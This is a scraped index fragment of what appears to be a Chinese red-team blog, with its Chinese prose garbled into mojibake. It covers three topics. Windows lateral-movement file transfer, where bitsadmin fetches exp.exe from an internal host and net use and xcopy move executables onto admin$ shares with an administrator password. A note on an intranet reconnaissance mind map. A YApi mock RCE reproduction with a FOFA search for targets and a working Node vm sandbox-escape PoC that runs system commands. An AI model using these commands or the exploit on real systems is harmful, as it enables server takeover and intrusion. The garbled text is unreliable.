åˆ†ç¦»åµŒå…¥çš„ ASN.1 å…ƒç´ ï¼Œå¹¶ä¿å­˜åˆ°æ–‡ä»¶ -f -- å¼ºåˆ¶è¦†ç›– é»˜è®¤ä¸‹è½½ä¸ºbinæ–‡ä»¶ã€‚ä½†æ˜¯ä¸å½±å“åœ¨å‘½ä»¤è¡Œä¸‹ä½¿ç”¨ã€‚ certutilè¿˜è‡ªå¸¦base64ç¼–ç è§£ç åŠŸèƒ½ certutil -encode c:\\downfile.vbs downfile.bat certutil -decode c:\\downfile.bat downfile.txt ","date":"2021-11-13","objectID":"/posts/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-windows%E7%AF%87/:4:0","tags":["pentest","RedTeam","å†…ç½‘æ¸—é€"],"title":"005-å†…ç½‘æ–‡ä»¶ä¼ è¾“æŠ€æœ¯ Windowsç¯‡","uri":"/posts/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-windows%E7%AF%87/"},{"categories":["Pentest"],"content":"äº”ã€bitsadmin BITSAdminæ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œå¯ç”¨äºåˆ›å»ºä¸‹è½½æˆ–ä¸Šä¼ å¹¶ç›‘è§†å…¶è¿›åº¦ã€‚ å…·ä½“ç›¸å…³å‚æ•°å‚è§ å®˜æ–¹æ–‡æ¡£ï¼š USAGE: BITSADMIN [/RAWRETURN] [/WRAP | /NOWRAP] command The following commands are available: /? Prints this help /UTIL /? æ‰“å°å®ç”¨ç¨‹åºå‘½ä»¤åˆ—è¡¨ /PEERCACHING /? æ‰“å°ç®¡ç†ç¼“å­˜çš„å‘½ä»¤åˆ—è¡¨ /CACHE /? æ‰“å°ç¼“å­˜ç®¡ç†å‘½ä»¤ /PEERS /? æ‰“å°ç®¡é“peerç®¡ç†å‘½ä»¤ /LIST [/ALLUSERS] [/VERBOSE] æ‰“å°ä»»åŠ¡åˆ—è¡¨ /MONITOR [/ALLUSERS] [/REFRESH sec] ç›‘æ§å¤åˆ¶ç®¡ç†å™¨ /RESET [/ALLUSERS] åˆ é™¤æ‰€æœ‰ä»»åŠ¡ /TRANSFER \u003cjob name\u003e [type] [/PRIORITY priority] [/ACLFLAGS flags] remote_url local_name ä¼ è¾“ä¸€ä¸ªæˆ–å¤šä¸ªæ–‡ä»¶. [type] ä¸º/DOWNLOADæˆ–/UPLOAD; é»˜è®¤ä¸ºä¸‹è½½ å¯ä»¥æŒ‡å®šå¤šä¸ª URL/æ–‡ä»¶å¯¹ã€‚local_name åªæ”¯æŒ ç»å¯¹è·¯å¾„ bitsadmin /transfer 123 http://192.168.111.1:8080/exp.exe C:\\Users\\1day\\Desktop\\exp.exe net use \\\\DC\\admin$ /u:\"administrator\" \" 1qaz@WSX\" bitsadmin /TRANSFER /DOWNLOAD \\\\WEB\\admin$\\temp\\t.exe C:\\windows\\temp\\t.exe bitsadmin /TRANSFER /UPLOAD c:\\windows\\temp\\t.exe \\\\WEB\\admin$\\temp\\t.exe bitsadminï¼Œå®ƒå¯ä»¥åœ¨ç½‘ç»œä¸ç¨³å®šçš„çŠ¶æ€ä¸‹ä¸‹è½½æ–‡ä»¶ï¼Œå‡ºé”™ä¼šè‡ª åŠ¨é‡è¯•ï¼Œåœ¨æ¯”è¾ƒå¤æ‚çš„ç½‘ç»œç¯å¢ƒä¸‹ï¼Œæœ‰ç€ä¸é”™çš„æ€§èƒ½ã€‚ E:\\\u003ebitsadmin /rawreturn /transfer down \"http://192.168.1.115/robots.txt\" E:\\PDF\\robots.txt /RAWRETURN è¿”å›æ•°æ®æ›´é€‚åˆè§£æ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œbitsadminè¦æ±‚æœåŠ¡å™¨æ”¯æŒRangeæ ‡å¤´ã€‚å¦‚æœéœ€è¦ä¸‹è½½è¿‡å¤§çš„æ–‡ä»¶ï¼Œéœ€è¦æé«˜ä¼˜å…ˆçº§ã€‚é…åˆä¸Šé¢çš„ä¸‹è½½å‘½ä»¤ã€‚å†æ¬¡æ‰§è¡Œ bitsadmin /setpriority down foreground /SETPRIORITY \u003cjob\u003e \u003cpriority\u003e # è®¾ç½®å·¥ä½œä¼˜å…ˆçº§ Priority usage choices: FOREGROUND HIGH NORMAL LOW ","date":"2021-11-13","objectID":"/posts/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-windows%E7%AF%87/:5:0","tags":["pentest","RedTeam","å†…ç½‘æ¸—é€"],"title":"005-å†…ç½‘æ–‡ä»¶ä¼ è¾“æŠ€æœ¯ Windowsç¯‡","uri":"/posts/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-windows%E7%AF%87/"},{"categories":["Pentest"],"content":"å…­ ã€Xcopy Windows è‡ªå¸¦å‘½ä»¤ï¼Œå¤åˆ¶æ–‡ä»¶å’Œç›®å½•æ ‘ # å»ºç«‹ç½‘ç»œä¼šè¯ net use \\\\DC\\admin$ /u:\"administrator\" \"password\" # ä»æœ¬åœ°æ¨åˆ°è¿œç«¯ xcopy /s /h /d /c /y C:\\Windows\\Temp\\t.exe \\\\WEB\\\\admin$\\temp\\ # ä»è¿œç«¯æ‹‰åˆ°æœ¬åœ° xcopy /s /h /d /c /y \\\\WEB\\\\admin$\\temp\\t.exe C:\\Windows\\Temp\\ å‚æ•°è®²è§£ï¼š XCOPY source [destination] source æŒ‡å®šè¦å¤åˆ¶çš„æ–‡ä»¶ã€‚ destination æŒ‡å®šæ–°æ–‡ä»¶çš„ä½ç½®å’Œ/æˆ–åç§°ã€‚ /S å¤åˆ¶ç›®å½•å’Œå­ç›®å½•ï¼Œä¸åŒ…æ‹¬ç©ºç›®å½•ã€‚ /H ä¹Ÿå¤åˆ¶éšè—æ–‡ä»¶å’Œç³»ç»Ÿæ–‡ä»¶ã€‚ /D:m-d-y å¤åˆ¶åœ¨æŒ‡å®šæ—¥æœŸæˆ–æŒ‡å®šæ—¥æœŸä»¥åæ›´æ”¹çš„æ–‡ä»¶ã€‚å¦‚æœæ²¡æœ‰æä¾›æ—¥æœŸï¼Œåªå¤åˆ¶é‚£äº›æºæ—¶é—´æ¯”ç›®æ ‡æ—¶é—´æ–°çš„æ–‡ä»¶ã€‚ /C å³ä½¿æœ‰é”™è¯¯ï¼Œä¹Ÿç»§ç»­å¤åˆ¶ã€‚ /Y å–æ¶ˆæç¤ºä»¥ç¡®è®¤è¦è¦†ç›–ç°æœ‰ç›®æ ‡æ–‡ä»¶ã€‚ ","date":"2021-11-13","objectID":"/posts/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-windows%E7%AF%87/:6:0","tags":["pentest","RedTeam","å†…ç½‘æ¸—é€"],"title":"005-å†…ç½‘æ–‡ä»¶ä¼ è¾“æŠ€æœ¯ Windowsç¯‡","uri":"/posts/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-windows%E7%AF%87/"},{"categories":["Pentest"],"content":"å›½åº†æ•´ç†äº†ä¸€ä¸‹å†…ç½‘çš„çŸ¥è¯†ç‚¹ï¼Œæ­£åœ¨åˆ¶ä½œè„‘å›¾ï¼Œæ€»ä½“è„‘å›¾å¤ªå¤§äº†ï¼Œå…ˆæ‹†åˆ†å‡ºå†…ç½‘ä¿¡æ¯æœé›†éƒ¨åˆ†è„‘å›¾ï¼Œåç»­çš„æ…¢æ…¢æ•´ç†æ‰©å……ã€‚","date":"2021-10-07","objectID":"/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E8%84%91%E5%9B%BE/","tags":["å†…ç½‘æ¸—é€","Pentest","RedTeam"],"title":"004-å†…ç½‘æ¸—é€ å†…ç½‘ä¿¡æ¯æœé›†è„‘å›¾","uri":"/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E8%84%91%E5%9B%BE/"},{"categories":["Pentest"],"content":"â€‹ å›½åº†æ•´ç†äº†ä¸€ä¸‹å†…ç½‘çš„çŸ¥è¯†ç‚¹ï¼Œæ­£åœ¨åˆ¶ä½œè„‘å›¾ï¼Œæ€»ä½“è„‘å›¾å¤ªå¤§äº†ï¼Œå…ˆæ‹†åˆ†å‡ºå†…ç½‘ä¿¡æ¯æœé›†éƒ¨åˆ†è„‘å›¾ï¼Œåç»­çš„æ…¢æ…¢æ•´ç†æ‰©å……ã€‚ è¿›å…¥å†…ç½‘åæ‰€å…³æ³¨çš„ä¿¡æ¯ä¸»è¦åŒ…æ‹¬å¦‚ä¸‹ï¼š æ“ä½œç³»ç»Ÿç‰ˆæœ¬ã€ä¸»æœºä¿¡æ¯ã€è¡¥ä¸ä¿¡æ¯ ç”¨æˆ·ä¹ æƒ¯ã€å¯†ç æ”¶é›†ã€ç¤¾äº¤è½¯ä»¶æ”¶é›†ã€ç”¨æˆ·ä¸‹è½½ç›®å½• ç”¨æˆ·åˆ—è¡¨ï¼Œç”¨æˆ·æƒé™ ç«¯å£åˆ—è¡¨ è¿›ç¨‹åˆ—è¡¨ï¼šå…³æ³¨æ€æ¯’è½¯ä»¶ã€è¿œç¨‹ç®¡ç†è½¯ä»¶ç­‰ æœåŠ¡åˆ—è¡¨ ç½‘ç»œè¿æ¥ï¼šç½‘ç»œå…±äº«ã€ä¼šè¯ä¿¡æ¯ã€å†…ç½‘IPåœ°å€æ®µä¿¡æ¯ç­‰ åŸŸç¯å¢ƒï¼šåŸŸå†…ä¸»æœºï¼Œæ“ä½œç³»ç»Ÿã€åº”ç”¨è½¯ä»¶ã€è¡¥ä¸ã€æœåŠ¡ã€æ€æ¯’è½¯ä»¶ä¸€èˆ¬éƒ½æ˜¯æ‰¹é‡å®‰è£…çš„ æ•´ç†å¦‚å›¾ï¼š å­—æ•°ä¸å¤Ÿï¼ŒèŠèŠå…¶ä»–ï¼š æœ€è¿‘å­¦ä¹ çš„æœ‰ç‚¹è¿·èŒ«ï¼Œæ„Ÿè§‰å‰å‰ååå­¦çš„ä¸œè¥¿ä¹Ÿä¸å°‘ï¼Œä½†æ˜¯æ€»è§‰å¾—ç¼ºå°‘äº†çµæ´»ï¼Œä¸å¤Ÿèä¼šè´¯é€šï¼Œæƒ³ç€å¤šæ•´ç†å¤šå†™å†™ä¸œè¥¿æ˜¯ä¸æ˜¯èƒ½å¾—åˆ°æ–°çš„æ”¶è·ã€‚ çº¸ä¸Šå¾—æ¥ç»ˆè§‰æµ…ï¼Œæ¸—é€æ˜¯é—¨å®æˆ˜çš„è‰ºæœ¯ï¼Œå¸Œæœ›æ—©æ—¥èµ°å‡ºè‡ªå·±çš„ä¸€æ­¥ã€‚ä»Šå¤©åˆšå¥½çœ‹åˆ°äº†ä½™å¼¦å¸ˆå‚…çš„æ–‡ç« ã€Šé—²èŠé»‘å®¢æˆé•¿è·¯å¾„ã€‹ï¼Œå¸Œæœ›èƒ½æ—©æ—¥å®ç°ä¸‰å¤§èƒ½åŠ›ï¼š èƒ½æŒ–å¥½æ¼æ´ï¼Œæ‰‹æ¡å¥½ 0dayï¼› èƒ½é»‘å®¢å·¥ç¨‹åŒ–ï¼Œæ‰‹æ¡å¥½æ­¦å™¨ï¼› èƒ½ç©å¥½æ¸—é€ï¼Œæ‹¿ä¸‹ç›®æ ‡ä¸ºå¯¼å‘ï¼› å¸ˆå‚…ä»¬ï¼Œä¸€èµ·åŠ æ²¹å§ï¼ ","date":"2021-10-07","objectID":"/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E8%84%91%E5%9B%BE/:0:0","tags":["å†…ç½‘æ¸—é€","Pentest","RedTeam"],"title":"004-å†…ç½‘æ¸—é€ å†…ç½‘ä¿¡æ¯æœé›†è„‘å›¾","uri":"/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E8%84%91%E5%9B%BE/"},{"categories":["æ¼æ´åˆ†æ"],"content":"å…¨æ–‡å…±è®¡2314å­—ï¼Œé¢„è®¡æ—¶é•¿6åˆ†é’Ÿã€‚ ","date":"2021-07-12","objectID":"/posts/yapi-mock-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/:0:0","tags":["æ¼æ´åˆ†æ","vuln"],"title":"003-Yapi Mock RCE æ¼æ´å¤ç°åˆ†æ","uri":"/posts/yapi-mock-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/"},{"categories":["æ¼æ´åˆ†æ"],"content":"0x01 åŸºæœ¬ä¿¡æ¯ æ¼æ´åç§° : YAPIè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ ç»„ä»¶åç§° : YAPI å½±å“èŒƒå›´ : YAPI \u003c= 1.9.2ï¼Œ æ¼æ´ç±»å‹ :è¿œç¨‹ä»£ç æ‰§è¡Œ åˆ©ç”¨æ¡ä»¶ : â€‹ 1ã€ç”¨æˆ·è®¤è¯ï¼šéœ€è¦ç”¨æˆ·è®¤è¯ â€‹ 2ã€è§¦å‘æ–¹å¼ï¼šè¿œç¨‹ ç»¼åˆè¯„ä»· : â€‹ \u003cç»¼åˆè¯„å®šåˆ©ç”¨éš¾åº¦\u003eï¼šä¸­ç­‰ï¼Œéœ€è¦ç”¨æˆ·è®¤è¯ã€‚ â€‹ \u003cç»¼åˆè¯„å®šå¨èƒç­‰çº§\u003eï¼šé«˜å±ï¼Œèƒ½é€ æˆè¿œç¨‹ä»£ç æ‰§è¡Œã€‚ â€‹ YAPIæ˜¯ç”±å»å“ªå„¿ç½‘ç§»åŠ¨æ¶æ„ç»„(ç®€ç§°YMFEï¼Œä¸€ç¾¤ç”±FEã€iOSå’ŒAndroidå·¥ç¨‹å¸ˆå…±åŒç»„æˆçš„å…·æƒ³è±¡åŠ›ã€åˆ›é€ åŠ›å’Œå½±å“åŠ›çš„å¤§å‰ç«¯å›¢é˜Ÿ)å¼€å‘çš„å¯è§†åŒ–æ¥å£ç®¡ç†å·¥å…·ï¼Œæ˜¯ä¸€ä¸ªå¯æœ¬åœ°éƒ¨ç½²çš„ã€æ‰“é€šå‰åç«¯åŠQAçš„æ¥å£ç®¡ç†å¹³å°ã€‚ â€‹ YAPIæ—¨åœ¨ä¸ºå¼€å‘ã€äº§å“å’Œæµ‹è¯•äººå‘˜æä¾›æ›´ä¼˜é›…çš„æ¥å£ç®¡ç†æœåŠ¡ï¼Œå¯ä»¥å¸®åŠ©å¼€å‘è€…è½»æ¾åˆ›å»ºã€å‘å¸ƒå’Œç»´æŠ¤ä¸åŒé¡¹ç›®ï¼Œä¸åŒå¹³å°çš„APIã€‚ â€‹ YApi æä¾›äº†ç¼–å†™JS è„šæœ¬æ–¹å¼æ¥æä¾›è‡ªå®šä¹‰mockåŠŸèƒ½ï¼ŒJSè„šæœ¬è¿è¡Œåœ¨NodeJsæ²™ç›’ä¸Šï¼Œç”±äºå®˜æ–¹çš„æ²™ç›’åªæ˜¯ä¸ºäº†éš”ç¦»ä¸Šä¸‹æ–‡ï¼Œå¹¶ä¸æä¾›ä»»ä½•å®‰å…¨ä¿è¯ï¼›mockè„šæœ¬è‡ªå®šä¹‰æœåŠ¡æœªå¯¹JSè„šæœ¬åŠ ä»¥å‘½ä»¤è¿‡æ»¤ï¼Œç”¨æˆ·å¯ä»¥æ·»åŠ ä»»ä½•è¯·æ±‚å¤„ç†è„šæœ¬ï¼Œæ”»å‡»è€…å¯åˆ©ç”¨è¯¥æ¼æ´åœ¨å—å½±å“çš„æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„javascriptä»£ç ï¼Œé€šè¿‡ç²¾å¿ƒæ„é€ çš„Javascriptä»£ç å¯ä»¥ç»•è¿‡æ²™ç›’å¹¶ç”¨äºæ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ï¼Œä»è€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œæœ€ç»ˆå¯¼è‡´æ¥ç®¡å¹¶æ§åˆ¶æœåŠ¡å™¨ã€‚ ç”±äºYapiç®¡ç†å¹³å°é»˜è®¤å¼€æ”¾æ³¨å†Œï¼Œæ”»å‡»è€…å¯ä»¥åœ¨è¿›è¡Œç®€å•çš„æ³¨å†Œä¹‹åï¼Œæ„é€ æ¶æ„çš„JSä»£ç ç»•è¿‡æ²™ç›’ï¼Œæœ€ç»ˆé€ æˆè¿œç¨‹ä»£ç æ‰§è¡Œè¿›è¡Œæ¼æ´åˆ©ç”¨ã€‚ â€‹ é—®é¢˜çš„æœ¬è´¨ï¼šåŠŸèƒ½æ»¥ç”¨ï¼ŒJSæ²™ç®±ç»•è¿‡å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œ ","date":"2021-07-12","objectID":"/posts/yapi-mock-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/:1:0","tags":["æ¼æ´åˆ†æ","vuln"],"title":"003-Yapi Mock RCE æ¼æ´å¤ç°åˆ†æ","uri":"/posts/yapi-mock-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/"},{"categories":["æ¼æ´åˆ†æ"],"content":"0x02 æ¼æ´å¤ç° fofa æœç´¢è¯­å¥ï¼š icon_hash=\"-715193973\" app=â€œYApiâ€ æœ¬åœ°å¤ç°ï¼š â€‹ Dockeræ­å»ºæµ‹è¯•ç¯å¢ƒï¼Œå‚è€ƒæ–‡æ¡£ï¼šã€ŠYapi+Dockerçš„å®‰è£…ä¸é…ç½®ã€‹ â€‹ åˆ›å»ºå®Œå®¹å™¨ä¹‹åå°±å¯ä»¥ä½¿ç”¨äº†ã€‚ åœ¨é¦–é¡µä¸‹æ–¹æ‰¾åˆ°ç™»å½•/æ³¨å†ŒåŠŸèƒ½æ¥å£ï¼Œæˆ–ç›´æ¥è®¿é—® /login è·¯å¾„è¿›è¡Œç™»å½•å’Œæ³¨å†Œã€‚ ç™»å½•ä¹‹åè¿›å…¥ä¸ªäººç©ºé—´ï¼Œåœ¨å³ä¾§ç‚¹å‡»æ·»åŠ é¡¹ç›®ï¼› æ·»åŠ æˆåŠŸåè¿›å…¥é¡¹ç›®ï¼Œç‚¹å‡»å³ä¾§åŒä¸€ä½ç½®æœ‰ä¸ªâ€œæ·»åŠ æ¥å£â€ æ·»åŠ å®Œä¹‹åï¼Œæ‰“å¼€æ¥å£ï¼Œè¿›å…¥â€œé«˜çº§Mockâ€åŠŸèƒ½ï¼Œç‚¹å‡»è„šæœ¬ï¼Œè¾“å…¥Pocï¼Œç‚¹å‡»ä¿å­˜å³å¯ã€‚ ç‚¹å‡»â€œé¢„è§ˆâ€ï¼Œè®¿é—®Mockåœ°å€ï¼Œå³å¯è§¦å‘æ¼æ´POCã€‚ POCå¦‚ä¸‹ï¼š const process = this.constructor.constructor('return process')()mockJson = process.mainModule.require(\"child_process\").execSync(\"whoami\").toString() ç‚¹å‡»â€œé¢„è§ˆâ€ï¼Œè®¿é—®Mockåœ°å€ï¼Œå³å¯è§¦å‘æ¼æ´POCï¼š ","date":"2021-07-12","objectID":"/posts/yapi-mock-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/:2:0","tags":["æ¼æ´åˆ†æ","vuln"],"title":"003-Yapi Mock RCE æ¼æ´å¤ç°åˆ†æ","uri":"/posts/yapi-mock-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/"},{"categories":["æ¼æ´åˆ†æ"],"content":"0x03 æ¼æ´åˆ†æ â€‹ è¿™ä¸ªæ¼æ´çš„åˆ©ç”¨æ¡ä»¶é¦–å…ˆéœ€è¦ç”¨æˆ·é€šè¿‡è®¤è¯ï¼Œè€ŒYAPI æ”¯æŒä»»æ„ç”¨æˆ·çš„æ³¨å†ŒåŠŸèƒ½ï¼Œ â€‹ æ³¨å†Œä¹‹åçš„ç”¨æˆ·è™½ç„¶æ²¡æœ‰ä»»ä½•åˆ†ç»„ä¸é¡¹ç›®çš„æƒé™ï¼Œå› æ­¤åªèƒ½æœç´¢ã€æµè§ˆ â€œå…¬å¼€é¡¹ç›®â€ çš„æ¥å£ã€‚ä½†æ˜¯æ–°ç”¨æˆ·ç™»å½•æ‹¥æœ‰ ä¸ªäººç©ºé—´ åˆ†ç»„ä¸‹çš„å…¨éƒ¨æƒé™ï¼Œä¸ªäººç©ºé—´åˆ†ç»„ä»…è‡ªå·±å¯è§ï¼Œå› æ­¤å¯ä»¥åœ¨è¿™é‡Œä»»æ„è¯•ç”¨ YApi çš„åŠŸèƒ½ã€‚ â€‹ è¿™é‡Œä¹Ÿå°±åŒ…æ‹¬äº†é«˜çº§MockåŠŸèƒ½ï¼Œè¯¥åŠŸèƒ½çš„æœ¬æ„æ˜¯æ–¹ä¾¿ç”¨æˆ·ç¼–å†™è‡ªå·±çš„JSè„šæœ¬ï¼Œè¯¥è„šæœ¬å°†ä¼šè¿è¡Œåœ¨NodeJSæ²™ç›’ä¸Šï¼Œä½†æ˜¯NodeJSæ²™ç›’å¹¶ä¸æä¾›å®‰å…¨ä¿è¯ã€‚å…³äºJSæ²™ç®±çš„å®‰å…¨é—®é¢˜æ—©æœ‰æ¢è®¨ã€‚ï¼ˆè§ ã€Šè¯´è¯´JSä¸­çš„æ²™ç®±ã€‹â€”â€”è…¾è®¯IVWEBå›¢é˜Ÿï¼‰ â€‹ NodeJSä¸­ä½¿ç”¨æ²™ç®±å¾ˆç®€å•ï¼Œåªéœ€è¦åˆ©ç”¨åŸç”Ÿçš„vmæ¨¡å—ï¼Œä¾¿å¯ä»¥å¿«é€Ÿåˆ›å»ºæ²™ç®±ï¼ŒåŒæ—¶æŒ‡å®šä¸Šä¸‹æ–‡ã€‚ const vm = require('vm'); const x = 1; const sandbox = {x:2}; vm.createContext(sandbox); //Contextify the sandbox. const code = 'x += 40;var y=17;'; vm.runInContext(code,sandbox); console.log(sandbox.x); // 42 console.log(sandbox.y); // 17 console.log(x);// 1; y is not defined. â€‹ vmä¸­æä¾›äº†runInNewContextã€runInThisContextã€runInContextä¸‰ä¸ªæ–¹æ³•ï¼Œä¸‰è€…çš„ç”¨æ³•æœ‰ä¸ªåˆ«å‡ºå…¥ï¼Œæ¯”è¾ƒå¸¸ç”¨çš„æ˜¯runInNewContextå’ŒrunInContextï¼Œå¯ä»¥ä¼ å…¥å‚æ•°æŒ‡å®šå¥½ä¸Šä¸‹æ–‡å¯¹è±¡ã€‚ â€‹ å¯æƒœçš„æ˜¯ å¦‚æœè¿™æ ·ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨åŸå‹é“¾ç»•è¿‡ï¼Œå¦‚ä¸‹ const vm = require('vm'); vm.runInNewContext(\"this.constructor.constructor('return process')().exit()\") â€‹ ç½‘ä¸Šå…³äºNodeJSã€æ²™ç®±ä¸€ç±»çš„å®‰å…¨æŠ€æœ¯ç ”ç©¶ä¹Ÿæœ‰å¾ˆå¤šï¼Œå¯ä»¥å‚è€ƒä¸‹å­¦ä¸€å­¦ã€‚ â€‹ å›åˆ°è¿™ä¸ªæ¼æ´ï¼Œå·²çŸ¥Mockè„šæœ¬ä¼šåœ¨æ²™ç®±ä¸­è¿è¡Œï¼Œé‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦åˆ©ç”¨ç±»ä¼¼ä¸Šé¢çš„åŸå‹é“¾è¿›è¡Œç»•è¿‡ï¼Œé€€å‡ºæ²™ç®±ï¼Œå†æ„é€ è°ƒç”¨å‘½ä»¤å³å¯ã€‚ Pocï¼š const process = this.constructor.constructor('return process')() mockJson = process.mainModule.require(\"child_process\").execSync(\"whoami\").toString() â€‹ æ³¨æ„ï¼Œè¿™é‡Œä¸éœ€è¦åŠ  exitï¼ŒåŠ äº†ä»¥åyapiæœåŠ¡ä¼šé€€å‡ºã€‚ ç½‘ä¸Šçš„Pocå…¶å®è¡¨è¾¾çš„æ„æ€æ˜¯ä¸€æ ·çš„ï¼Œå¦‚ä¸‹ï¼š const sandbox = this const ObjectConstructor = this.constructor const FunctionConstructor = ObjectConstructor.constructor const myfun = FunctionConstructor('return process') const process = myfun() mockJson = process.mainModule.require(\"child_process\").execSync(\"whoami\").toString() æˆ‘è®¤ä¸ºè¿™ä¸ªé—®é¢˜çš„æœ¬è´¨æ˜¯åŠŸèƒ½çš„æ»¥ç”¨ï¼ŒJSæ²™ç®±ç»•è¿‡å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚ä¹‹å‰çœ‹äº†ä¸€ä¸ªæ–‡æ¡£ã€Šnodejså‘½ä»¤æ‰§è¡Œå’Œæ²™ç®±å®‰å…¨ã€‹ï¼Œä»–æ‰€è¯´çš„å†…å®¹æœ‰å¯¹ä¹Ÿæœ‰ä¸å¯¹çš„åœ°æ–¹ã€‚ â€‹ ä½œè€…è®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªæ­£å¸¸çš„åŠŸèƒ½ï¼Œ â€œå¾ˆå¤šå®‰å…¨äººå‘˜æ²¡æ·±å…¥å¼€å‘æˆ–è€…æ˜¯ç»“åˆåˆ°sdlä¸­ï¼Œæ‰€ä»¥å¯¹è¿™äº›éœ€æ±‚çš„ç†è§£ä¸æ·±åˆ»ã€‚é‚£ä¹ˆå‡è®¾æˆ‘ä»¬è¦æ‰§è¡Œè¿™ä¸ªéœ€æ±‚ï¼Œè¿™ä¸ªéœ€æ±‚å°±æ˜¯è¦æ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œå› ä¸ºä¸šåŠ¡ä¼šæœ‰åƒå¥‡ç™¾æ€ªçš„éœ€æ±‚ï¼Œå‰ç«¯nodejså°±è¦æ‰§è¡Œå‘½ä»¤æ¥æµ‹è¯•çš„ã€‚â€ï¼Œæˆ‘è™½ç„¶ä¹Ÿæ˜¯è„±ç¦»ä¸šåŠ¡çš„å®‰å…¨äººå‘˜ï¼Œä½†ä¹Ÿç›¸ä¿¡ç¡®å®å­˜åœ¨å„ç§ä¹±ä¸ƒå…«ç³Ÿçš„éœ€æ±‚ï¼Œæ‰§è¡Œå‘½ä»¤ä¹Ÿç¡®å®æœ‰å®ƒçš„å®¢è§‚éœ€è¦ã€‚ â€‹ ä½†æ–‡ç« ä½œè€…è®¤ä¸ºè¿™ä¸ªæ­£å¸¸çš„åŠŸèƒ½ï¼Œä¸éœ€è¦ä¿®å¤ï¼Œæˆ‘è§‰å¾—ä¸å¯¹ã€‚ â€‹ Mock æä¾›çš„JSè„šæœ¬ç¡®å®æ˜¯æ­£å¸¸çš„åŠŸèƒ½ï¼Œä½†æ˜¯ä¸æ˜¯çœŸçš„éœ€è¦ç»™ä»»ä½•äººéƒ½å¼€æ”¾è¿™ä¸ªæƒé™å‘¢ï¼Ÿ â€‹ æˆ‘è®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªåŠŸèƒ½çš„æ»¥ç”¨ï¼ŒMockçš„åˆè¡·æ˜¯å¥½çš„ï¼Œä½†æ˜¯å´å®¹æ˜“å¯¼è‡´è¢«æ”»å‡»è€…æ¶æ„åˆ©ç”¨ï¼Œé€ æˆçš„å±å®³æ˜¯é‡å¤§çš„ã€‚å®‰å…¨æ˜¯ä¸€é—¨å¹³è¡¡çš„è‰ºæœ¯ï¼Œæ˜¯ä¸ºäº†ä¿éšœä¸šåŠ¡æŒç»­ç¨³å®šå®‰å…¨çš„è¿è¡Œã€‚è¿™æ¬¡çš„é—®é¢˜è¿˜æ˜¯ä¾§é‡åœ¨ç”¨æˆ·æƒé™ä¸Šï¼Œå®˜æ–¹å…è®¸æ–°ç”¨æˆ·ç™»å½•æ‹¥æœ‰ ä¸ªäººç©ºé—´ åˆ†ç»„ä¸‹çš„å…¨éƒ¨æƒé™ï¼Œå¯ä»¥åœ¨è¿™é‡Œä»»æ„è¯•ç”¨ YApi çš„åŠŸèƒ½ï¼Œè¿™æ ·ä»»ä½•äººéƒ½å¯ä»¥è¿è¡ŒMockè„šæœ¬ï¼Œç»§è€Œé—´æ¥å¯¼è‡´ä»»ä½•äººéƒ½å¯ä»¥æ§åˆ¶æœåŠ¡å™¨æƒé™ï¼Œè¿™æ˜¯å­˜åœ¨å®‰å…¨éšæ‚£çš„ã€‚ â€‹ æˆ‘è®¤ä¸ºæˆ–è®¸å¯ä»¥è¿›è¡Œå¹³è¡¡ï¼Œé™åˆ¶æ™®é€šç”¨æˆ·çš„æƒé™ï¼Œåªå…è®¸å¯ä¿¡çš„äººæ¥æ“ä½œï¼Œå¯¹æƒé™è¿›è¡Œå®Œå–„åˆ’åˆ†ï¼Œå¯¹äºå¯ä»¥æ§åˆ¶æœåŠ¡å™¨ã€æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„è¿™äº›é«˜å±æ“ä½œåº”å½“äºˆä»¥é™åˆ¶ç­‰ã€‚ â€‹ 